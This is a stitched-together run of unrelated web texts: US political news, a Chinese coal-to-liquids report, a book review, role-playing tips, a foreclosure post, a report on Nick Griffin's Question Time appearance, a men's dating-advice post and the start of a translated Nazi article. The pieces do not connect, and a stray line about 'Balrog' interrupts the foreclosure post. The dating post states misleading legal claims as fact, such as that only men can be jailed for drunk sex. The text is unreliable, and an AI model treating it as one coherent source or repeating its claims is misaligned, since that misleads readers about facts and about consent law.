And although I would dearly love to provide chirstwire with a scoop , I ’m afraid I have to insist they print a clarification on this one ( my comment ) before all my usual man bitches start getting jealous and raise their prices .
EDIT : Atheist Nexus seem to think christwire is a genuine religious hate speech site http://www.atheistnexus.org/forum/topics/christwire-1
EDIT : From the comments below and on reddit it would appear the self - styled “ investigative journalist ” Stephenson Billings , who made the above accusations of me , does n’t realise christwire is a parody site .
Either that or christwire is n’t supposed to be a parody site but it is regularly usurped by bloggers with a satirical genius who ’ve made it one .
This just keeps getting better , but DAMN YOU POE’S LAW !!

Those who remember the street parties of Election Night 2008 might think the testosterone levels of Obama voters had shot up in triumph .
That would be wrong .
Instead , liberal testosterone levels stayed stable , while those of male Republican voters plummeted .
The latter also reported feeling submissive and unhappy .
There are many ways to read these results , which are based on saliva samples taken from 183 men and women as the polls closed , and again when President Obama 's victory was officially announced .
First , male voters get the same vicarious boost from a candidate 's political victory as they would their favorite sports team beating a rival .
That 's the main academic finding of the study , published Wednesday in Public Library of Science ONE , but one that seems rather self - evident .
Much more interesting is the split .
Obama voter testosterone merely stabilized .
The researchers suggest that , as nighttime testosterone levels typically dip , stabilization " is conceptually similar to a rise . "
But if testosterone usually just dips at night , it positively plummeted for Republican men .
Indeed , Republican men " felt significantly more controlled , submissive , unhappy and unpleasant at the moment of the outcome " than those who voted for Obama , the researchers wrote .
" Moreover , since the dominance hierarchy shift following a presidential election is stable for four years , the stress of having one 's political party lose control of executive policy decisions could plausibly lead to continued testosterone suppression in males . "
Women of both political parties , it should be noted , experienced no significant testosterone changes on election night .

Republicans Meg Whitman and Carly Fiorina face a tall order in their quest for the state ’s highest political offices : Persuade voters they ’re not just wealthy ex-CEOs looking to indulge their egos in politics now that their business careers are tapped out .
That ’s why their failure to perform the most basic civic duty — voting — for much of their adult lives is a potentially powerful issue , analysts say .
It reinforces the notion that their interest in politics is less than sincere .
“ It confirms voters ’ suspicions that they ’re running out of boredom or because they like the trappings of power , ” said Darry Sragow , a longtime Democratic strategist who is not involved in either race .
The voting controversy has turned into early trouble for Whitman , dogging the former eBay chief at almost every turn in her run for governor .
Although she repeatedly apologized for her poor voting record , she may have made matters worse when she said , “ I was focused on raising a family , on my husband ’s career , and we moved many , many times . ”
Many regular voters , of course , also have busy lives .
As for Fiorina , who has yet to formally announce her candidacy for the Senate , her spotty voting history has drawn less attention , but it ’s widely expected the former head of Hewlett - Packard will have to address it .
Records from the Santa Clara County Registrar ’s
Office show she voted in just six of 14 elections since 2000 , skipping the presidential primaries of 2000 and 2004 and sitting out all gubernatorial elections , including the 2003 recall election .
By contrast , the other presumed candidates in the governor and Senate races — political veterans all — have spotless voting records this decade , records show .
Republican gubernatorial contender Steve Poizner did miss one primary election in 2002 , but that ’s because he was living in Washington , D.C. , for a fellowship and was not registered in California at the time .
The Mercury News did not analyze voting records before 2000 because of inconsistencies in how registrars in California and other states maintain old voting data .
Whether the issue permanently stains voters ’ impressions of the CEO candidates or recedes to the background as the campaigns unfold may hinge on the overall sketch that emerges of them in the coming months .
If they can make a compelling case that the state would benefit from their business acumen — a claim their opponents are sure to challenge — failing to vote may not matter much .
The issue has come up for other candidates in previous campaigns — and it has not been devastating .
Republican political consultant Sean Walsh has advised two gubernatorial candidates with weak voting records — Bill Simon in 2002 and Arnold Schwarzenegger in 2003 — and in both cases it caused a minor stir but faded quickly .
He said he’d be surprised if the voting controversy is still making headlines next year .
“ In this environment of record foreclosures and 12 percent unemployment , it ’s the last thing that voters are going to base their decision on , ” Walsh said .
His advice to Whitman and Fiorina : Settle on an explanation for their voting behavior , stick to it and move on .
In 1998 , Sragow managed the gubernatorial campaign of former airline tycoon Al Checchi , who also had a spotty voting record .
But while the issue was raised at times by opponents to sow suspicions of Checchi ’s motivations , it never became a focal point of the race .
The former Northwest Airlines chief executive took much more heat for spending millions of his personal fortune on attack ads .
But Sragow does not necessarily think the issue will fade this time around .
For Whitman and Fiorina , he said , the significance of their voting histories will “ depend on how it fits in with other pieces of information ” — supplied by the candidates themselves as well as their opponents and the media — that emerge over the course of the campaign .
The Mercury News interviewed a dozen Bay Area voters — Republicans , Democrats and independents — to try to gauge how much of a difference a candidate ’s voting record will make .
Most said it would certainly affect their vote — though it would n’t be the most important thing on their minds when they enter the polling booth .
“ Frankly , I ’d much rather have someone who is a nonpolitician , ” said Republican Victor Critchfield , a 48 - year - old Los Altos contractor .
“ I ’d rather have someone who has had a real job and is n’t a political weasel . ”
Of Whitman and Fiorina , Critchfield said : “ I think the fact that they ’re successful businesswomen who have run companies and have had tens of thousands of people working for them is more important than how many times they ’ve voted . ”
But Hayward voter Judy Vetrovec believes voting records matter .
Calling the duo’s voting history a “ black mark but not a disqualification , ” the 67 - year - old independent added that she does n’t accept Whitman ’s explanation that she was too busy raising her children and moving .
Vetrovec said she raised five children and always found time to vote .
“ With absentee and mail - in ballots , they make it so easy to vote in the leisure of your home , ” she said .
“ So to me , it means she truly does n’t understand how important voting is .
That bothers me . ”
As CEO of the Silicon Valley Leadership Group for the past 14 years , Carl Guardino has dealt with a lot of executives who are focused on research and development , marketing and running companies — and do n’t see much relevance in the political antics in Sacramento and Washington .
“ But I think in life people have light - bulb moments , ” he said , saying he could understand Whitman ’s explanation that she suddenly became interested in the political world when she saw how government rules and regulations were “ getting in the way ” of eBay and other businesses .
The voting controversy was sparked by a Sacramento Bee story last month that suggested Whitman did not register to vote until age 46 .
That claim has since been debunked , but there ’s no doubt she has a checkered voting record .
As infrequently as Fiorina has voted this decade , her voting record in the decade before she moved to California is even worse .
Fiorina did not go to the polls at all from 1989 to 1999 when she was living in New Jersey , her spokeswoman , Beth Miller , confirmed .
“ She ’s clearly on record saying it ’s bad not to vote , and she regrets not voting , ” Miller said .
She added that Fiorina would have more to say about her voting record if she decides to forge ahead with a Senate campaign .
Fiorina is expected to decide whether to run within the next several weeks .

Shenhua shows the way to make gas from coal
By Si Tingting ( China Daily )
Updated : 2009-01-22 07:58
In the middle of the Ordos Desert that borders North China 's Inner Mongolia autonomous region and Shaanxi province , a huge factory was recently built to perform the kind of tricks that most people believe only magicians are capable of doing - turning black solid coal into clean liquid fuels .
The factory , owned by China 's biggest coal producer , the Shenhua Group , is surrounded by dozens and dozens of coal mines and sits on top of an enormous coal deposit renowned for its quality .
It is also home to many top scientists who are undertaking research and development of direct coal liquefaction technology .
Although relatively unfamiliar in most people 's vocabulary , the technology dates back to World War II when German scientists developed a technology to convert coal into liquid fuels like gasoline and diesel .
With oil prices falling since 1985 , the interest in coal liquefaction also slowly declined across the globe .
China , a net oil importer with rich coal reserves , however decided to pursue the efforts and teamed up with the US , Japan and Germany for feasibility studies in Inner Mongolia autonomous region , Heilongjiang province and Yunnan province , respectively .
Shenhua 's proposal of building a direct coal liquefaction plant in Ordos in Inner Mongolia was granted State approval in 2002 , and after seven years of efforts , this world 's largest direct coal liquefaction facility rose from paper , adopting a cutting - edge technology tested only on some small demonstration programs before .
The first trial operation of this 10 - billion - yuan facility was launched on Dec 30 , 2008 and the quality end products , namely diesel , naphtha and liquefied natural gas , came out on the second day .
The trial was stopped after it ran successfully for more than 300 hours .
" We are happy to see the trials going on for over 24 hours .
So far the results have far exceeded our expectations , " said Zhang Jiming , manager , Shenhua direct coal - to - liquids ( CTL ) project in Ordos .
" With the success of the trials , China officially becomes the first country in the world to have the core competence to build and run a direct coal - to - liquids project capable of producing 1 million tons of fuels annually , " he said .
" If the second trial operation , to be launched in summer , turns out to be a success , its production will be normalized and we will begin to expand this project to three times its current size , " Zhang said .
By then , the entire coal liquefaction facility would be able to contribute 3 million tons of clean fuels annually .
China imported 178 million tons of crude last year , and its oil import dependency was around 50 percent .
" Coal liquefaction could greatly reduce the country 's dependence on foreign oil when it is widely adopted , but mastering the technology is our priority for now , " he added .
Zhang Xiwu , chairman , Shenhua Group , equates the importance of Shenhua 's direct coal liquefaction technology to the satellite monitor technology demonstrated in the successful mission of China 's third manned spacecraft Shenzhou VII last September .
The end products are composed of 70 percent clean diesel , and the rest are liquefied natural gas and naphtha , which could be used as chemical feedstocks .
" This technology certainly produces clean fuels with low sulfur , nitrogen and metal content .
We minimize the pollutants and could achieve almost zero-emission during the production process , " Zhang said , adding that the diesel produced with his CTL process is even cleaner than fuels of Euro V emission standards .
However , debates over the economic viability to put the coal liquefaction technology into full - scale commercialization never abate , but only grow louder after international crude prices dropped significantly from a record $ 147.27 a barrel in July 2008 to as low as $ 33.87 in December .
Coal can be used to produce liquid fuel suitable for transportation applications by removal of carbon or addition of hydrogen , either directly or indirectly .
Direct liquefaction is one of the most efficient technologies currently available for this .
However , the cost of converting coal into liquid fuel is higher than the cost of refining crude .
What still makes the technology attractive to pursue is the relative price of coal and oil .
Shenhua Group completed the feasibility study of the direct CTL project in 2001 when international oil prices were about $ 23 a barrel .
But experts believe that a CTL plant in China needs an oil price of $ 40 or more to be free from financial risks .
" If this line 's operation could be normalized , we can definitely make ends meet .
However , to make this operation more economically sound , we have to expand its scale , " said Zhang .
" Anyway , the price of coal here is very cheap .
Actually , our project is sitting right on top of a large coalfield that could feed this project for over 100 years , " he said .
With a proven coal reserve of 223.6 billion tons , Ordos is listed as the eighth biggest coal mine in the world .
" Despite all the talks about economics , I feel it a must for China to master the technology , as the country needs more and more liquid fuels , most of which are imported .
The pirates along the oil transportation routes and the political changes in the Middle East are affecting our imports , " he said .
" The fuel we produce out of coal could be an important source of strategic oil reserves to ensure energy security . "
The National Development and Reform Commission issued a notice in September to suspend all other CTL projects except for the two run by Shenhua , one in Inner Mongolia and the other in Ningxia Hui autonomous region , saying there are still risks involved in this technology and capital - intensive business .
Since then , Shenhua is the only official player in this mega - buck game .
According to Zhang , the CTL project needs an investment of 10 billion yuan to increase capacity by 1 million tons and it could make better profit when it is run on a large scale .
The project , however , had its share of critics too , who termed it an environmental hazard .
Many people believed that the CTL project is water - consuming and hence the decision to build the facility in the middle of a desert could be definitely unwise , said Kenneth G. Tasker , director and technical advisor , Axens , a US company which provides engineering design and technical services for the Ordos project .
" However , they did n't know that the CTL project has installed a facility to achieve complete recycling of the water used , " he said .
To provide enough water for the Ordos CTL project , groundwater is piped in from 100 kilometers away .
Statistics show that the project needs about 6.5 tons of water to produce one ton of liquid fuel .
The water consumption per unit of industrial value - added is only about 7 percent of the nation 's average level .
" In addition , with this piped - in water , the trees we grow in the middle of this desert could be watered everyday .
These trees could keep the sand down , so that it does not blow towards Beijing , " he said .
The process of converting coal into liquid fuels releases CO2 , just as the extraction and refinement of liquid fuel production from petroleum would do .
Therefore , the Ordos project has proposed to adopt carbon dioxide sequestration measures to avoid releasing it into the atmosphere , said Zhang .
" Though sequestration will add to the cost , we will carry on with the feasibility study and apply it when the expansion project gets started , " he said .
Republican Gomorrah : Inside the Movement that Shattered the Party
By Max Blumenthal
Hardcover : 416 pages , $ 25
Nation Books : New York
September 2009
This is n't a book for the faint of heart .
The deep underbelly of the Republican right is far weirder , and far more disturbing , than most observers recognize .
The corruption , the sex scandals , the lust for power - - it 's all here , presented in a fast - moving romp that 's part sociology , part psychology , part gossip column .
But that 's gossip in a good way .
It 's well - documented gossip , not just rumors , and the personal and political stories behind the personalities that fill these pages is critical to the web that Blumenthal constructs , showing the ties that you did n't know existed from notorious serial killer Ted Bundy who James Dobson used to amass part of his forture , to Gary Bauer to Blackwater 's Erik Prince to Ralph Reed to Jack Abramoff to Tom Delay to Tony Perkins to David Duke to Tom Coburn to Bill Kristol to Sarah Palin .
They 're all there , and the story of how all these players have become connected with an extreme and pathological " religious " philosophy to take over the Republican party is fascinating .
Blumenthal explains where the current Republican Party came from , who it 's foundational thinkers were , and just why it 's still so dangerous .
While the conventional wisdom is that the Southern Baptists are at the core of the religious right movement , Blumenthal shows that the movement actually grew out of the works of R.J. Rushdoony , the son of survivors of the Armenian genocide , who devoted his life to nothing less than replacing America 's constitutional democracy with a theocracy based on Leviticus case law .
Calling for the literal application of all 613 laws described in the Book of Leviticus , Rushdoony paid special attention to punishments .
Instead of serving prison sentences , criminals would be sentenced to indentured servitude , whipped , sold into slavery , or executed .
" God 's government prevails , " Rushdoony wrote , " and His alternatives are clear - cut : either men and nations obey His laws , or God invokes the death penalty against them . "
Those eligible on Rushdooney 's long list for execution included disobedient children , unchaste women , apostates , blasphemers , practitioners of witchcraft , astrologers , adulterers , and of course , anyone who engaged in " sodomy or homosexuality . "
Burning at the stake , death by " the sword , " and hanging were some of Rushdoony 's preferred modes of execution .
However , his son - in - law Gary North , a self - styled Reconstructionist economist ( who eventually fell out wiht his father - in - law ) and former adviser to Republican Representative Ron Paul of Texas . . . advocated stoning evildoers to death .
Rocks ,
North argued , are free and plentiful , making them ideal tools for the financially savvy executioner .
( pp. 20 - 11 )
Rushdoony 's writings influenced people like Bush 's faith - based initiatives czar Marvin Olasky and Howard F. Ahmanson Jr. , whose vast wealth funded Rushdoony 's think tank , as well as a number of intelligent design initiatives and California ’s anti-gay Prop 8 initiative .
Rushdoony also heavily influenced Francis Schaeffer , a 1960s icon of the Jesus Freak movement who became radicalized with the Roe v.
Wade decision and essentially created the violent anti-abortion movement , out of which grew the larger political effort around " values voters , " attacking all of the secular underpinnings of America .
The rest , essentially , is the political history of the Republican Party for the last 40 years .
Then there 's the sex .
It might seem that the slightly icky things we 've learned about the private lives of everyone from John Ensign to David Vitter to Mark Foley to Ted Haggard are just an entertaining offshoots of the larger movement , but Blumenthal sees more .
Drawing from Erich Fromm's Escape from Freedom , about the psychology of Nazism and authoritarianism , and Eric Hoffer 's The True Believer , Blumenthal describes the frame of reference for so many of the adherents of this extreme fundamentalist worldview , many of whom were brutalized as children .
He desribes it in a discussion with Scott Horton :
Followers of the Christian right openly admit that they have no capacity to restrain themselves from total depravity without constant , stern commandments from an angry God .
As Gov. Mark Sanford , an evangelical minister , declared during his recent press conference confessing an extra-marital affair , the " bottom line of God ’s law " is to " protect us from ourselves . "
Senator John Ensign , the only Pentectostal serving in the Senate , attributed his own sexual dalliances to having " walked away from God , " or having relied too heavily on his individual will .
These figures believe if they do n’t do what God supposedly wants them to do they will descend immediately and inevitably into sin and perversion –because that ’s what they want to do .
Fromm explained that those who seek to obliterate the self in the drama of an authoritarian crusade have attempted a " neurotic solution " that always leads to self - destructiveness .
They use right - wing politics as a form of cheap medication , hoping to cleanse their sullen souls by purging the land of sin .
But cheap medication rarely works .
Thus none of the recent Republican sex scandals are unique ; they are reflective of the sensibility of the movement that took over and shattered the GOP , and which Fromm analyzed so concisely in his 1941 book , Escape From Freedom .
And , by bowing before James Dobson and mouthing the correct words , they find absolution .
And , if they are n't gay , political rehabilitation .
The cases of David Vitter and Larry Craig are particularly representative of this .
One quibble I 've got with Blumenthal - - his assertion in the book 's title that by allowing itself to be subsumed by the religious right , the Republican party has shattered .
It has n't yet , and Blumenthal 's own book shows the danger that the nation is still in as long as the American body politic -- and opinion makers and political leaders -- underestimate the degree to which this mindset has taken over the Republican party .
Torture was n't just the outgrowth of Dick Cheney 's personal evil , it was the inevitable result of the " Holy War " the administration was waging .
Without a real understanding or acceptance of the extremism , of the radical and violent nature ( which is bubbling up more and more frequently since Sarah Palin unleashed the beast during the 2008 campaign ) of what is now the Republican base , we carry on as if the Republican party was operating as the counterpoint to the Democratic party , as if it were somehow still the " loyal opposition , " and not fundamentally committed to the radical overthrow of secular America .
Bargaining with the Republicans in Congress as if they were partners in governing America is a very bad bet .
I 've saved some of the more fun stuff , particularly Max 's great expose work from Alaska on Sarah Palin , for him to talk about .

Here are some thoughts on running one - shot sessions – games that have a beginning and an end – in 3 - 5 hours of play .
Nick DiPetrillo and I have a lot of experience with these kind of games thanks to our work on Zombie Murder Mystery .
Our customers and playtesters have been loving the 1 game format .
I thought I ’d share our game prep success formula with you .
Writing a one - shot session can be easy if you know which elements of your story to work on first .
Think of a place , a reason for the group to be there , as wells as a conflict , and you ’re well on your way .
The one - shot session success formula
This section is adapted from the hard work Nick DiPetrillo put into Zombie Murder Mystery .
Thanks Nick !
1. Isolation
Your adventure location should be somewhere hard to get into and out of .
This helps limit the scope of the game .
2. Build on assumptions
You do n’t want to spend 5 hours preparing for a game that ’s going to last less than that .
Build on assumptions .
This is the golden rule we used for Zombie Murder Mystery – you can read it aloud to your players at the beginning of the session :
“ We are building a story together .
You can make assumptions about the situations and encounters your characters are in and my job is to go along with whatever you ’re assuming unless it directly contradicts something that was already established . ”
That sets the tone and opens vast possibilities .
Do n’t restrict .
Enable !
3. Time Limit
Something needs to drive your players into action !
If they have all the time in the world they will be hesitant to act .
They need something looming over them to spur them forward .
Make it as clear as possible that the threat , the time limit , is final and unavoidable .
Otherwise players have a tendency to think they can figure out a way to beat the threat .
4. Stake
The characters should have something at stake .
Survival is fine , but the best scenarios have something the characters care about more than their life : power , treasure , redemption , saving the world …
—-
Keep those four things in mind and chances are you ’ll play an entertaining game from beginning to end .
Have fun !

What do you try to do when you run a one - shot session ?

Business Management offers this great visual for understanding income in equality in the U.S.
Each light blue figure in this visual represents 50 years of work at minimum wage ( making $ 15,080 a year ) ; the medium blue figures represent 50 years of work at the average wage ( making $ 40,690 a year ) ; the dark blue figures represent 50 years as the President of the United States ( making $ 400,000 a year ) .
Let ’s take the most dramatic example , just for fun : Hewlett - Packard .
A minimum wage worker would have to work for 2,256 years to make what what the CEO of Hewlett - Packard makes in a year .
The average worker would have to work 836 years to match his yearly salary .
And Barack Obama would have to President for 85 years before he made what the CEO of Hewlett - Packard makes in one year .

Diana Olick at CNBC has some BofA info : What Banks Are Really Doing With Foreclosures
Bank of America :
Foreclosure sales have been abnormally low since we learned of the pending implementation of the administration ’s Making Home Affordable program .
From that point , we delayed the initiation of foreclosure proceedings and sales for customers that may eligible for a loan modification under MHA .
As a result of this policy , our foreclosure sales in recent months have been as little as half the normal pace we experienced before .
...
Now that Making Home Affordable programs are operational , we do project an increase in foreclosures as we exhaust every available option to qualify customers for modifications and other solutions .
...
We do not hold foreclosed properties off the market .
According to BofA , they are not sitting on REOs ( Real Estate Owned ) for longer than normal , but they are holding off foreclosing - pending modification attempts .
That is basically what the data says too .
The Q2 FDIC Quarterly Banking Profile showed the banks held $ 11.5 billion in 1 - 4 family residential REO at the end of Q2 .
That is the same level as the last several quarters .
But what has really changed is the surge in delinquencies - combined with the banks holding off foreclosing .
As BofA notes , this will lead to a wave of foreclosures later this year and into 2010 , however the size of the wave depends on the success of the modification programs ( not looking great so far ) .
Wow , this is so crazy and a huge buff for Balrog !

Nick Griffin said today he was the victim of a " lynch mob " audience drawn from a city that had been " ethnically cleansed " and was " no longer British " .
The BNP leader 's comments prompted Boris Johnson , the mayor of London , to say that there was " no place here " for Griffin or his party as he urged Londoners to reject his " extremist and offensive views " .
Fellow Question
Time panelist Bonnie Greer admitted today she had to restrain herself from slapping Griffin last night , before adding she was glad she had n't because he was " totally trounced " on the show .
Griffin vowed to lodge a complaint at the " unfair " way the Question Time programme was produced , despite the BNP 's claims that his appearance sparked the " biggest single recruitment night in the party 's history " .
Griffin claims he was treated unfairly by the panel and audience and complained that the show , held at BBC Television Centre in London , was broadcast from a city which had changed beyond all recognition because of what he called uncontrolled immigration .
" That was not a genuine Question Time ; that was a lynch mob , " he told Sky News .
He went on : " That audience was taken from a city that is no longer British ...
That was not my country any more .
Why not come down and do it in Thurrock , do it in Stoke , do it in Burnley ?
" Do it somewhere where there are still significant numbers of English and British people [ living ] , and they have n't been ethnically cleansed from their own country . "
He added : " There is not much support for me there [ in London ] , because the place is dominated by ethnic minorities .
There is an ethnic minority that supports me : the English .
But there 's not many of them left . "
The Conservative mayor swiftly hit back on behalf of Londoners : " Nick Griffin is right to say London is not his city .
London is a welcoming , tolerant , cosmopolitan capital which thrives on its diversity .
The secret of its long - term success is its ability to attract the best from wherever they are and allow them to be themselves – unleashing their imagination , creativity and enterprise .
The BNP has no place here and I again urge Londoners to reject their narrow , extremist and offensive views at every opportunity . "
The BNP has exploited concerns about immigration among the white working class in some of London 's poorer areas to gain representation on several councils in the capital .
It holds a seat on the capital - wide London Assembly and has 12 seats on Barking and Dagenham council , making it the second biggest party there after Labour , with six other council seats across three London boroughs .
The BNP leader insisted that his performance last night was " fine " , despite it being panned by the press , with his own party officials admitting today that their leader had made a less than impressive showing on last night 's show as he was repeatedly criticised by fellow panelists and jeered by a hostile audience .
Greer , the playwright and critic who sat next to Griffin on the Question Time panel , told the Daily Mail Griffin had been " trembling like a leaf " throughout his appearance .
Sitting next to him was " probably the weirdest and most creepy experience of my life " , she said .
" I spent the entire night with my back turned to him .
At one point , I had to restrain myself from slapping him .
But it was worth it because he was totally trounced . "
The BNP leader said he needed a second chance on the BBC flagship programme .
" People wanted to see me and hear me talking about things such as the postal strike .
One or two questions about what a wicked man I am , fair enough , but the whole programme – it was absurd .
Let 's do it again but do it properly this time . "
He also said that he wanted to challenge justice secretary Jack Straw , who was on last night 's panel , to a one - to - one debate on the issues of the day , and called on David Cameron to disassociate himself from the protests outside BBC Television Centre where the programme was recorded .
A spokeswoman for the Tory party leader said Cameron , who supports the campaign aims of anti-fascist groups , said he had no intention of responding to Griffin .
Griffin's thumbs - down on last night was not shared by his French counterpart Jean - Marie Le Pen , who predicted today that the BBC 's decision to invite Griffin on the show would lead to a surge in support for the party .
The BNP later today posted a message on its website claiming that 3,000 people registered to sign up as members once a current recruitment freeze - introduced in response to legal action over the party 's discriminatory membership rules - has been lifted .
" This figure represents the single largest block of new membership expressions of interest ever , and will , once formally signed up , have boosted party membership by nearly 30 % . "
Earlier today , Le Pen , who has previously described his own appearance on a similar programme in France in the early 1980s as " the hour that changed everything " for his party , told the London Evening Standard : " Small fish become big so long as God gives them life .
All political groups have started as marginal before becoming important . "
Le Pen – a member of the European parliament , like Griffin – attacked the " scandalous " protests over the BBC 's decision , which he said presented a " narrow idea of democracy " .
" Trying to stop an elected individual from expressing himself on mainstream media appears scandalous , " he told the Standard .
Le Pen 's own popularity rose after he appeared on the French programme L'heure de Verité in 1984 , before which he had been virtually boycotted by the French media .
Voting intentions for the Front National in the European elections in June that year subsequently doubled , from 3.5 % to 7 % , and in the election itself the FN scored 11 % ( 2.2 m votes ) .
A Figaro - Magazinepoll conducted after the broadcast showed that the proportion of those with a " positive opinion " of Le Pen rose to 13 % , and then rose again to 17 % by the summer .
He came second in the French presidential race in 2002 , ahead of Lionel Jospin , the former prime minister .
Le Pen said today : " The BBC is conducting itself in a democratic way with regard to the English people .
He [ Griffin ] will reveal his ideas .
It 's up to the people to judge . "
Downing Street said Gordon Brown did not watch last night 's edition of Question Time , but he telephoned Straw to thank him for appearing on the programme .
" He very rarely watches Question Time , " Brown 's spokesman said .
" He is often busy on important government matters , finishing paperwork and other government business .
He was certainly engaged on government business . "
The BBC said that average viewing figures for the programme were almost 8 million – meaning around three times more viewers tuned in than usual .
By midday today , it had received more than 350 complaints following the broadcast .
More than 240 people felt the show was biased against the BNP , while more than 100 of the complaints were about Griffin being allowed to appear on Question Time .
Peter Hain , the Welsh secretary and former anti-apartheid campaigner who attacked the BBC for inviting Griffin on the programme , denounced the broadcast .
" The BBC should be ashamed of single - handedly doing a racist , fascist party the biggest favour in its grubby history , " he said .
" Our black , Muslim and Jewish citizens will sleep much less easily now the BBC has legitimised the BNP by treating its racist poison as the views of just another mainstream political party when it is so uniquely evil and dangerous . "
Straw disagreed , saying it had been right to debate the BNP on Question Time , but stressed it was time for the political agenda to move on .
" Mr Griffin was last night exposed as a fantasising conspiracy theorist with some very unpleasant views and no moral compass .
But now that he has been exposed for what he is it is time to move on , " he said .
" There is no denying that many people are disillusioned with mainstream politics .
The imperative now is to engage with them directly and put the extremist BNP sideshow behind us . "
The Liberal Democrats ' home affairs spokesman , Chris Huhne , a panelist on the programme , cautioned against writing off the BNP based on Griffin 's shaky performance last night .
" The crucial issue is whether anybody who was watching the programme will have emerged from it thinking he is a more credible figure and I do n't think that was the case , " he told GMTV .
" The more difficult issue is the surrounding publicity , where the people who did n't see the programme are actually going to be impressed by the credibility of the BNP as a result , and we will have to wait and see . "
The Labour MP Diane Abbott said Griffin should not have been able to appear on the programme .
" It 's all very well in the morning to say , ' Oh well , he got smashed , ' but in the long run people who are attracted to the BNP will come away saying he was a victim , " she said .
" When you put the BNP into the mainstream like that they drag people on to their agenda .
Everyone is talking about Nick Griffin .
The programme has given him unnecessary exposure , unnecessary credibility , and giving more credibility to a fascist party in the middle of a recession is a very dangerous thing . "
Griffin was repeatedly pilloried last night when he was dubbed the " Dr Strangelove " of British politics after attempting to claim the mantle of Winston Churchill and struggling to explain his denial of the Holocaust .
LHtFA … five letters that mean the difference between survival and despair for any male in America and others in Canada and the UK .
Leave .
Her. the Fuck .
Alone .
The context in which this should be applied is simple .
Any time that you are in any sort of social interaction with a woman , if for whatever reason she states that she wants you to cease your current level of interaction , you should stop that activity and abandon the field as quickly as humanly possible .
This rule applies especially in situations regarding romantic or sexual liaisons , but works in any social situation as well .
The second that a woman asks or demands that you stop , you should do so at once and then leave .
Once you have left , call at least two friends ( preferably one of them female ) and let them know that you have initiated an LHtFA .
Make sure that they record the person you were with , time , date , and your location at the time that you called them .
Head to one of those friends ’ current location at once or head home , especially if you have a roommate or family member who you know is also home .
Once you get there , let them know that you are home and again let them know that you have initiated a LHtFA and with who .
If you are in the workplace , follow those rules , except that instead upon initiating the LHtFA action , you go to your desk and document the situation at once .
If possible , let another co-worker know that you were in an interaction with this woman and inform them of the details as well .
This is all for your protection in case of a harassment accusation , which is all too possible in today ’s workplace environment .
I ’m sure that some women will object to this idea .
Unfortunately , the current legal climate has made any other action tantamount of entering a environment of risk .
You risk having accusations levied against you ranging from harassment on the mild end to rape on the severe end of things .
I ’m sure that a lot of men will also object to this line of thinking , associating it to trained cowardice or “ giving in to the women . ”
In the parlance of combat , it is called a measured retreat .
The overall idea behind LHtFA is that you as a man are taking control of everything in the social situation if it does not go the way you want .
This does so in a manner which will not take advantage of the other person involved in that situation but at the same time will leave you in a position where you can safely control the outcome of the situation .
If by chance that there is an accusation of rape or sexual assault , you will have a degree of documentation that will assist you in defending yourself in the case .
I ’ll use the most relevant example .
If you , a man are on a date with a woman and as the evening goes on , things begin to heat up .
The date ventures into the physical and then suddenly the woman says :
“ Stop , I do n’t think we should do this . ”
At that point , muster up whatever willpower you have available and do so .
Stop at once .
At that point you should end the date .
Be polite and take her home , if you took her out , or part company if you two met somewhere .
But for the sake of your safety , you need to end that date now .
If she asks why you are ending the evening , tell her that you are doing so because you “ wish to respect her wishes and this is the most efficient way you know to let things end on a safe note . ”
Do not allow her to convince you that “ she wants to cuddle , ” or that “ you should be a man , stay but control yourself . ”
Cuddling is how you got into that situation in the first place and intimate contact will only lead you there again .
As for “ being a man , ” you are .
You are exercising your right to step away and cool off before a situation gets too heated .
If she ca n’t understand that , then there is a definite problem with her and you do n’t need to be a party to that problem .
I have followed this doctrine for 30 years and I have seen both respect and derision from the women I were involved with when I had to initiate a LHtFA action .
The ones who respected me for doing this have at the least remained friends as they appreciated my understanding and desire to keep things under control .
As for the ones who have derided me for doing this ; I made a point of never seeing them again and have been better for doing so .
With that being said ,
If you ’re out with your buddies at the club or the bar , you should designate somebody ( preferably the “ designated driver ” ) to also be the LHtFA monitor .
As the monitor for the evening , your job is simple .
If one of your buddies attempts a hookup with a drunk girl or if he ’s drunk trying to hook up , you are there to perform a “ remote LHtFA . ”
He may hate you at the moment and even accuse you of “ cock - blocking . ”
But he ’ll praise your name the next day when he realizes that you saved him from possibly getting nailed for date ( gray ) rape ; whether it would have happened or not .
Until US law recognizes that the fact that a man and a woman who have been imbibing alcohol and end up in a sexual act are both incapable of giving or receiving informed consent to sexual activity , any male who gets involved in a “ drunk fuck ” is tempting fate and dancing in front of the gates of jail .
Currently , only men can go to jail for drunk sex .
A sober friend performing a remote LHtFA can protect you from that horror .
And finally …if you are trying to hook up with a woman anywhere .
If she does n’t smile and enthusiastically respond to your initial conversation or clearly tells you that she ’s not interested , initiate an LHtFA action at once .
Calling her names and haranguing her over it are only going to get you possibly ridiculed or at worse , arrested .
Calling her a “ bitch ” only makes you look like a punk , anyway .
Why are you getting all worked up over a woman who does n’t want you in the first place ?
LHtFA and go about your business .
She is n’t worth jail , man .
In closing , I ’m sure that some women will look at this and claim that this is only going to be used by some rapist to help himself get off from an accusation that he rightfully deserved .
I ’m sorry that some of you will feel this way .
However , false rape has been a bugbear in the male community for more than a century .
Allow me to list some historically instances where a false rape accusation has caused untold damage .
Look up Rosewood , Florida in 1923 , Tulsa , Oklahoma in 1921 ( Black Wall Street ) , and Scottsboro , Alabama in 1931 ( The Scottsboro Boys ) .
All of those incidents , while racially motivated , also stemmed from false rape accusations by women against men .
Then , there are people trying to discount the video evidence used to exonerate the four young men involved in the recent Hofstra rape case .
The fact that the current argument being brought against the boys is that they should still be punished for recording the sexual activity without the girl ’s permission , shows that the prevailing attitude about rape accusations is more about retribution against “ any man accused including the ones that got away , ” than justice for the falsely accused .
LHtFA …watchwords of survival for the 21st century American man .
Tattoo them somewhere on your body where you ’ll remember them … .

Background : Nazism claimed to be a worldview , a system that applied to every aspect of life .
This article from the party monthly for its leaders explains that interior decoration and the celebration of holidays and festivals should also be guided by the party .
One should be able to know someone was Nazi by how he lived his personal life , the writer suggests .
Another page translates a Nazi discussion of what a house should like .
The source : Wolfgang Schultz , “ Auch an seinem Heim erkennt man den Nationalsozialisten ! ” Der Hoheitsträger 3 ( August 1939 ) , pp. 16 -18 .
I ’m not entirely sure of the month -— the copy I am working from is in a bound volume with the cover missing .
One Recognizes a National Socialist by His Home !
Each party leader , just as any party member , has an unspoken duty to live his personal life in ways consistent with the National Socialist idea .
It is one of the finest tasks , worth every effort .
One ’s surroundings are a central part of personal life , the things we ourselves make and form : our family , our home , our festivals .
The strength we draw from them enables us to do many other things with greater joy , energy , and conviction .
